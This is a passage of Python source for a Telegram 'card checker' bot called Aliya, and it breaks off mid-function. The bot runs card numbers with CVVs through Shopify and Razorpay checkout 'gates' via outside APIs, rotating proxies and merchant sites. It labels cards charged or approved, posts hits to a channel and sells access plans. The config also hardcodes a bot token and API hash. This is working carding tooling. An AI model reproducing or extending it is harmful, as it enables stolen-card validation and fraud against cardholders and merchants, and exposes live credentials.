# 𝘼𝙡𝙞𝙮𝙖 𝘽𝙤𝙩
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.extensions import html as thtml
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
import logging
import socket
import platform
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from telethon.errors import UserNotParticipantError, ChatAdminRequiredError, ChannelPrivateError

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database import (
    init_db, db,
    ensure_user, get_user_plan, set_user_plan, is_premium_user, is_banned_user,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_site_db, get_user_sites, remove_site_db,
    save_card_to_db, get_total_cards_count, get_charged_count, get_approved_count,
    get_all_premium_users, get_total_users, get_premium_count,
    get_total_sites_count, get_users_with_sites, get_sites_per_user, get_all_sites_detail,
    mark_user_joined, is_user_marked_joined, remove_joined_mark
)

# ====================== LOGGING ======================
log = logging.getLogger("Aliya")
log.setLevel(logging.INFO)
_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setLevel(logging.INFO)
_ch.setFormatter(_log_fmt)
log.addHandler(_ch)
try:
    _fh = logging.FileHandler('aliya_bot.log', encoding='utf-8')
    _fh.setLevel(logging.INFO)
    _fh.setFormatter(_log_fmt)
    log.addHandler(_fh)
except: pass


def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")


def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")


# ====================== BOLD SANS ======================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for _i, _c in enumerate(_normal_upper): _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower): _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits): _BOLD_SANS_MAP[_c] = _bold_digits[_i]


def bs(text):
    if not text: return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))


# ====================== CONFIG ======================
API_ID = 36879858
API_HASH = "31edb415db51ac8be94379cdb9bcb236"
BOT_TOKEN = "8948177751:AAFuW9daEhYcdg05jG0zmP8yQ5du2_aWz38"
ADMIN_ID = [8032246466]
HIT_CHANNEL_ID = -1004321624246
JOIN_GROUP_ID = -1004321624246
JOIN_CHANNEL_ID = -1004321624246
JOIN_GROUP_LINK = "https://t.me/+EUBl_-CrrlZmNWU1"
JOIN_CHANNEL_LINK = "https://t.me/ccdersellee"
FORCE_JOIN_IMAGES = ["", ""]

API_BASE_URL = os.getenv("API_BASE_URL", "https://afuonax-shopii-api-production.up.railway.app/shopify")
RAZORPAY_API_URL = os.getenv("RAZORPAY_API_URL", "https://rz.rcvan.indevs.in/rz")
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

OWNER_USERNAME = "ishani"
OWNER_URL = f"https://t.me/{OWNER_USERNAME}"
BOT_URL = f"https://t.me/{OWNER_USERNAME}_bot"
BOT_NAME = bs("Aliya")

SP_PER_USER_WORKERS = 30
MSP_PER_USER_WORKERS = 70
RZ_PER_USER_WORKERS = 30
MRZ_PER_USER_WORKERS = 50
SITE_PER_USER_WORKERS = 30
PROXY_PER_USER_WORKERS = 50
BIN_WORKERS = 20

# ── FAST TIMEOUTS ──
API_TIMEOUT = 15
BIN_TIMEOUT = 15
PROXY_TIMEOUT = 10
RZ_TIMEOUT = 20

BATCH_SIZE = 60
SITE_CHECK_BATCH = 40
HIT_DELAY = 1.5
PER_USER_LIMIT = 200
LOG_CHANNEL_ID = HIT_CHANNEL_ID
FREE_SP_DAILY_LIMIT = 15
FREE_SP_COOLDOWN = 10

PLANS = {
    "plan1": {"name": bs("Core Access"), "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$8.00"},
    "plan2": {"name": bs("Elite Access"), "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00"},
    "plan3": {"name": bs("Root Access"), "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25.00"},
    "plan4": {"name": bs("X-Access"), "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

# ── GATES ──
GATES_FILE = "gates.json"
GATES = {
    "shopify":  {"name": "Shopify",  "emoji": "🛍",  "enabled": True,  "cmd": "sp"},
    "stripe":   {"name": "Stripe",   "emoji": "💳",  "enabled": False, "cmd": None},
    "razorpay": {"name": "Razorpay", "emoji": "💳",  "enabled": True,  "cmd": "rz"},
    "paypal":   {"name": "PayPal",   "emoji": "🅿️",  "enabled": False, "cmd": None},
    "square":   {"name": "Square",   "emoji": "🟢",  "enabled": False, "cmd": None},
    "nmi":      {"name": "Nmi",      "emoji": "🔑",  "enabled": False, "cmd": None},
    "fatzebra": {"name": "FatZebra", "emoji": "🎫",  "enabled": False, "cmd": None},
    "payu":     {"name": "PayU",     "emoji": "💵",  "enabled": False, "cmd": None},
    "billdesk": {"name": "BillDesk", "emoji": "🧾",  "enabled": False, "cmd": None},
}


async def load_gates():
    try:
        if os.path.exists(GATES_FILE):
            async with aiofiles.open(GATES_FILE, "r", encoding="utf-8") as f:
                data = json.loads(await f.read())
                for k, v in data.items():
                    if k in GATES:
                        GATES[k]["enabled"] = bool(v.get("enabled", GATES[k]["enabled"]))
    except Exception as e:
        log_system("GATES", f"Load failed: {e}", "warning")


async def save_gates():
    try:
        data = {k: {"enabled": v["enabled"]} for k, v in GATES.items()}
        async with aiofiles.open(GATES_FILE, "w", encoding="utf-8") as f:
            await f.write(json.dumps(data, indent=2))
    except Exception as e:
        log_system("GATES", f"Save failed: {e}", "error")


_USER_SEMS = {}
_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)


def get_user_sem(uid, sem_type="msp"):
    key = f"{uid}_{sem_type}"
    if key not in _USER_SEMS:
        limits = {
            "sp": SP_PER_USER_WORKERS, "msp": MSP_PER_USER_WORKERS,
            "rz": RZ_PER_USER_WORKERS, "mrz": MRZ_PER_USER_WORKERS,
            "site": SITE_PER_USER_WORKERS, "proxy": PROXY_PER_USER_WORKERS,
        }
        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
    return _USER_SEMS[key]


def cleanup_user_sem(uid):
    for k in [k for k in _USER_SEMS if k.startswith(f"{uid}_")]:
        del _USER_SEMS[k]


CE = {
    "crown": 5039727497143387500, "bolt": 5042334757040423886,
    "brain": 5040030395416969985, "shield": 5042328396193864923,
    "star": 5042176294222037888, "gem": 5042050649248760772,
    "check": 5039793437776282663, "fire": 5039644681583985437,
    "party": 5039778134807806727, "search": 5039649904264217620,
    "chart": 5042290883949495533, "pin": 5039600026809009149,
    "joker": 5039998939076494446, "plus": 5039891861246838069,
    "cross": 5040042498634810056, "info": 5042306247047513767,
    "gift": 5041975203853239332, "eyes": 5039623284056917259,
    "trash": 5039614900280754969, "tick": 5039844895779455925,
    "stop": 5039671744172917707, "warn": 5039665997506675838,
    "link": 5042101437237036298, "globe": 5042186567783809934,
    "restart": 5413554170668032766, "online": 5413813953685923984,
    "declined": 4956612582816351459,
}
PE = "⭐"

ACTIVE_SESSIONS = {}
ACTIVE_MTXT_PROCESSES = {}
ACTIVE_MRZ_PROCESSES = {}
ACTIVE_ADD_PROCESSES = {}
PENDING_ADD_SITES = {}
PENDING_SITE_CHECK = {}
USER_APPROVED_PREF = {}
MAINTENANCE_FILE = "maintenance.json"
_MAINTENANCE_CACHE = {"enabled": None, "last_check": 0}
_JOIN_CACHE = {}
_FREE_SP_USAGE = {}
_FREE_SP_LAST_USE = {}

BOT_START_TIME = time.time()
HIT_BUTTON = [[Button.url(BOT_NAME, BOT_URL, style="success")]]

_USER_HTTP_SESSIONS = {}
_GLOBAL_BIN_SESSION = None
_GLOBAL_PROXY_SESSION = None


async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        timeout_val = RZ_TIMEOUT if purpose in ("rz", "mrz") else API_TIMEOUT
        connector = aiohttp.TCPConnector(limit=150, limit_per_host=50, ttl_dns_cache=300, use_dns_cache=True, keepalive_timeout=30, enable_cleanup_closed=True)
        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout_val, connect=8), connector=connector)
        _USER_HTTP_SESSIONS[key] = session
    return session


async def cleanup_user_http_session(uid, purpose="general"):
    session = _USER_HTTP_SESSIONS.pop(f"{uid}_{purpose}", None)
    if session and not session.closed:
        try: await session.close()
        except: pass


async def get_bin_session():
    global _GLOBAL_BIN_SESSION
    if _GLOBAL_BIN_SESSION is None or _GLOBAL_BIN_SESSION.closed:
        _GLOBAL_BIN_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5),
            connector=aiohttp.TCPConnector(limit=50, limit_per_host=20, ttl_dns_cache=300, use_dns_cache=True))
    return _GLOBAL_BIN_SESSION


async def get_proxy_session():
    global _GLOBAL_PROXY_SESSION
    if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=10),
            connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300, use_dns_cache=True))
    return _GLOBAL_PROXY_SESSION


# ====================== FREE TRACKER ======================
def _get_today_key(): return datetime.now().strftime("%Y-%m-%d")


def get_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 0}
        return 0
    return entry["count"]


def increment_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 1}
    else:
        _FREE_SP_USAGE[user_id]["count"] += 1


def get_free_sp_cooldown_remaining(user_id):
    last = _FREE_SP_LAST_USE.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed >= FREE_SP_COOLDOWN: return 0
    return round(FREE_SP_COOLDOWN - elapsed, 1)


def set_free_sp_last_use(user_id):
    _FREE_SP_LAST_USE[user_id] = time.time()


# ====================== SMART ROTATOR ======================
class SmartRotator:
    def __init__(self):
        self._site_fails = {}; self._proxy_fails = {}
        self._site_idx = 0; self._proxy_idx = 0
    def pick_site(self, sites, exclude=None):
        if not sites: return None
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude and self._site_fails.get(s, 0) < 5]
        if not available: available = [s for s in sites if s not in exclude]
        if not available: available = list(sites)
        self._site_idx = (self._site_idx + 1) % len(available)
        return available[self._site_idx]
    def pick_proxy(self, proxies, exclude=None):
        if not proxies: return None
        exclude = exclude or set()
        available = [p for p in proxies if p.get('proxy_url') not in exclude and self._proxy_fails.get(p.get('proxy_url'), 0) < 5]
        if not available: available = [p for p in proxies if p.get('proxy_url') not in exclude]
        if not available: available = list(proxies)
        self._proxy_idx = (self._proxy_idx + 1) % len(available)
        return available[self._proxy_idx]
    def report_site_ok(self, site): self._site_fails[site] = 0
    def report_site_fail(self, site): self._site_fails[site] = self._site_fails.get(site, 0) + 1
    def report_proxy_ok(self, p):
        if p: self._proxy_fails[p] = 0
    def report_proxy_fail(self, p):
        if p: self._proxy_fails[p] = self._proxy_fails.get(p, 0) + 1
    def get_site_fails(self, site): return self._site_fails.get(site, 0)
    def get_dead_sites(self, t=5): return {s for s, c in self._site_fails.items() if c >= t}


# ====================== ERROR KEYWORDS ======================
SITE_ERROR_KEYWORDS = [
    'r4 token empty', 'payment method is not shopify', 'r2 id empty', 'product id is empty',
    'py id empty', 'clinte token', 'receipt_empty', 'receipt id is empty', 'receipt empty',
    'site requires login', 'failed to get token', 'no valid products', 'not shopify',
    'failed to get checkout', 'failed to detect product', 'failed to create checkout',
    'failed to get proposal data', 'site not supported', 'site error! status: 429',
    'token not found', 'handle is empty', 'payment method identifier is empty',
    'failed to get session token', 'failed to tokenize card', 'no_session_token',
    'no session token', 'no checkout token found', 'checkout token not found',
    'no checkout token', 'checkout token is empty', 'tokenize_fail', 'tokenize fail',
    'tax ammount empty', 'tax amount empty', 'tax amount is empty', 'del ammount empty',
    'site not supported for now', 'payment base card not supported', 'no product found',
    'checkout is not available', 'cart is empty', 'cart add failed after retries',
    'checkout_expired', 'checkout_not_found', 'no shipping methods available',
    'site error', 'site dead', 'site errors', 'server error', 'internal server error',
    'internal_server_error', 'application error', 'unexpected error',
    'something went wrong', 'error in 1st req', 'error in 1 req',
    'error processing card', 'we could not process', 'unable to process',
    'payment provider error', 'payment gateway error', 'session expired',
    'session invalid', 'failed after retries', 'max retries exceeded',
    'all sites dead', 'all sites unavailable', 'processinf error', 'handle error',
    'nonetype', "nonetype' object has no attribute 'get", 'unknown error',
    'unknown_error', 'unknown_result', 'utm_source', 'shop is unavailable',
    'store is unavailable', 'store not found', 'page not found',
    'this store is unavailable', 'this shop is currently unavailable',
    'password protected', 'enter store using password', 'storefront is password protected',
    'shop closed', 'store closed', 'delivery_delivery_line_detail_changed',
    'delivery_address2_required', 'delivery_line_detail_changed', 'delivery_line',
    'delivery_address', 'address_required', 'submit_rejected', 'submit rejected:',
    'change proxy or site', 'change site', 'fake charge gate', 'fake gate',
    'hcaptcha detected', 'hcaptcha_detected', 'captcha at checkout',
    'captcha_required', 'captcha required', 'cloudflare', 'access denied',
    'permission denied', 'connection error', 'connection failed', 'timed out',
    'timeout', 'could not resolve host', 'connect tunnel failed', 'unreachable',
    'network error', 'connection reset', 'empty reply from server', 'tlsv1 alert',
    'ssl routines', 'openssl ssl_connect', 'api_timeout', 'http error', 'httperror504',
    '502', '503', '504', 'bad gateway', 'service unavailable', 'gateway timeout',
    'site error! status: 404', 'site error! status: 401', 'amount_too_small',
    'amount too small', 'merchandise_not_enough_stock', 'product out of stock',
    'malformed input', 'url rejected', 'invalid_response', 'cart failed with status',
    'invalid json response', 'invalid json', 'inventoryreservationfailure',
    'inventory_reservation_failure', 'payments_positive_amount_expec',
    'payments_payment_flexibility_t', 'payments_credit_card_brand_not',
    'buyer_identity_presentment_currency', "'products'", "error:", "error: '",
    'unable to get payment token', 'empty submit response', 'empty submit',
    'order_total_changed', 'order total changed', 'invalid_payment_method',
    'invalid payment method', 'validation_custom', 'validation custom',
    'ARTIFACT_DISSATISFACTION', 'artifact_dissatisfaction',
    'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'tax_new_tax_must_be_accepted',
    'PROCESSING_ERROR', 'processing_error', 'DELIVERY_COMPANY_REQUIRED',
    'delivery_company_required', 'DECISION_RULE_BLOCK', 'decision_rule_block', 'timeout'
]
PROXY_ERROR_KEYWORDS = ['proxy dead', 'proxy error', 'proxy timeout', 'proxy connection failed', 'proxy refused']
RZ_RETRY_KEYWORDS = [
    'payment id not found', 'payment_id_not_found', 'timeout', 'timed out',
    'connection error', 'connection failed', 'connection reset', 'server error',
    'internal server error', '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'empty reply', 'invalid json', 'could not resolve host',
    'network error', 'ssl routines', 'unreachable', 'proxy dead', 'proxy error',
    'proxy timeout', 'DEAD | Payment ID not found',
]


def is_site_error(text):
    if not text: return True
    lower = text.lower().strip()
    if lower == 'na': return True
    return any(kw in lower for kw in SITE_ERROR_KEYWORDS)


def is_proxy_error(text):
    if not text: return False
    return any(kw in text.lower().strip() for kw in PROXY_ERROR_KEYWORDS)


def is_rz_retry_error(text):
    if not text: return True
    return any(kw in text.lower().strip() for kw in RZ_RETRY_KEYWORDS)


def is_truly_alive(response, price):
    if not response: return False
    lower = response.lower().strip()
    pc = str(price).replace('$', '').strip() if price else '0'
    try: pv = float(pc)
    except: pv = 0.0
    bad = ['error:', 'error: ', "error: '", 'cart failed', 'invalid json',
           'inventoryreservationfailure', 'payments_positive_amount',
           'payments_payment_flexibility', 'payments_credit_card_brand']
    for b in bad:
        if b in lower: return False
    if pv == 0.0:
        normal = ['card_declined', 'card declined', 'generic_decline', 'generic decline',
                   'do_not_honor', 'do not honor', 'insufficient_funds', 'insufficient funds',
                   'stolen_card', 'lost_card', 'expired_card', 'expired card',
                   'otp_required', 'otp required', '3d', 'authentication',
                   'cvc', 'ccn', 'generic_error', 'generic error',
                   'restricted_card', 'fraudulent', 'not_permitted',
                   'transaction_not_allowed', 'card_not_supported']
        if not any(n in lower for n in normal): return False
    return True


def normalize_site_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url)
    url = url.rstrip('/')
    if url.startswith('www.'): url = url[4:]
    if '/' in url: url = url.split('/')[0]
    return url


# ====================== MESSAGE SYSTEM ======================
client_instance = None


def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)


async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False), timeout=15)
    except asyncio.TimeoutError:
        return None
    except:
        try:
            return await asyncio.wait_for(event.reply(html_text[:4000], parse_mode='html', link_preview=False), timeout=10)
        except: return None


async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False), timeout=15)
    except: return None


async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False), timeout=8)
    except: pass


def pbtn(text, data=None, url=None, style=None):
    if url: return Button.url(text, url, style=style)
    if data: return Button.inline(text, data.encode() if isinstance(data, str) else data, style=style)
    return Button.inline(text, b"none", style=style)


# ====================== CARD FORMATTING ======================
def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='{OWNER_URL}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{bs('Price')}</b> ━ <code>{ps}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he


def format_card_result_no_price(status, card, gateway, response, bin_info=None):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='{OWNER_URL}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}</b> ━ <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>""", he


def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    el = f"\n<b>{bs(extra_field[0])}</b> ━ <code>{extra_field[1]}</code>" if extra_field else ""
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='{OWNER_URL}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>{el}
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}</b> ━ <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he


def format_rz_single_result(status, card, gateway, response, bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='{OWNER_URL}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}</b> ━ <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he


# ====================== FORCE JOIN ======================
async def is_user_joined(user_id):
    if user_id in ADMIN_ID: return True
    now = time.time()
    cached = _JOIN_CACHE.get(user_id)
    if cached and now - cached < 600: return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        try:
            r = await client_instance(GetParticipantRequest(channel=cid, participant=user_id))
            if isinstance(r.participant, ChannelParticipantBanned): return False
        except UserNotParticipantError: return False
        except (ChatAdminRequiredError, ChannelPrivateError): pass
        except: pass
    _JOIN_CACHE[user_id] = now
    return True


async def force_join_check(event):
    if event.sender_id in ADMIN_ID: return True
    if await is_user_joined(event.sender_id): return True
    _JOIN_CACHE.pop(event.sender_id, None)
    await remove_joined_mark(event.sender_id)
    buttons = [
        [pbtn(bs("Join Channel"), url=JOIN_CHANNEL_LINK, style="primary")],
        [pbtn(bs("Join Group"), url=JOIN_GROUP_LINK, style="primary")],
        [pbtn(bs("I have joined"), data="check_joined", style="success")]
    ]
    text = f"""{PE} <b>{bs('Access Locked')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Join Both Chats to Unlock')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Channel')}:</b> <i>{bs('ALIYA CHANNEL')}</i>
{PE} <b>{bs('Group')}:</b> <i>{bs('ALIYA Chat')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('All Features Restricted')}</b>"""
    try:
        await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]], file=random.choice(FORCE_JOIN_IMAGES))
    except:
        await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]])
    return False


# ====================== MAINTENANCE ======================
async def set_maintenance_mode(enabled):
    global _MAINTENANCE_CACHE
    try:
        async with aiofiles.open(MAINTENANCE_FILE, "w") as f:
            await f.write(json.dumps({"maintenance": enabled}))
        _MAINTENANCE_CACHE = {"enabled": enabled, "last_check": time.time()}
    except: pass


async def get_maintenance_mode():
    global _MAINTENANCE_CACHE
    now = time.time()
    if _MAINTENANCE_CACHE["enabled"] is not None and now - _MAINTENANCE_CACHE["last_check"] < 30:
        return _MAINTENANCE_CACHE["enabled"]
    try:
        if not os.path.exists(MAINTENANCE_FILE): return False
        async with aiofiles.open(MAINTENANCE_FILE, "r") as f:
            data = json.loads(await f.read())
            _MAINTENANCE_CACHE = {"enabled": data.get("maintenance", False), "last_check": now}
            return _MAINTENANCE_CACHE["enabled"]
    except: return False


async def check_maintenance(event):
    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, f"""{PE} <b>{bs('Maintenance')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Bot under maintenance')}</b>
{PE} <i>{bs('Try again later')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])
        return True
    return False


# ====================== ACCESS ======================
async def can_use(user_id, chat):
    await ensure_user(user_id)
    if await is_banned_user(user_id): return False, "banned"
    plan = (await get_user_plan(user_id)).title()
    return True, f"{plan}_private" if chat.id == user_id else f"{plan}_group"


async def get_user_access(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id): return False, "banned", "Bronze"
    plan = (await get_user_plan(event.sender_id)).title()
    return True, f"{plan}_private" if event.chat.id == event.sender_id else f"{plan}_group", plan


def get_cc_limit(plan, uid=None):
    if uid and uid in ADMIN_ID: return 10000
    p = plan.title() if plan else "Bronze"
    if p == "X": return 10000
    if p == "Root": return 5000
    if p == "Elite": return 2500
    if p == "Core": return 1500
    return 0


def is_paid_plan(plan):
    return plan.title() in PAID_TIERS if plan else False


async def send_group_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Group Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Free users')} → {bs('group only')}</b>
{PE} <i>{bs('Upgrade for private access')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["gem"]])


async def send_premium_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Premium Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('This feature requires an active plan')}</b>
{PE} <i>{bs('Use /plan to see available plans')}</i>""", buttons=[[pbtn(bs("Upgrade"), url=OWNER_URL, style="danger")]], emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])


def banned_user_message():
    return f"""{PE} <b>{bs('Banned')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Not allowed')}</b>
{PE} <b>{bs('Appeal')}:</b> <i>{bs('Contact Admin')}</i>""", [CE["stop"], CE["stop"], CE["warn"], CE["info"]]


# ====================== UTILITIES ======================
def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
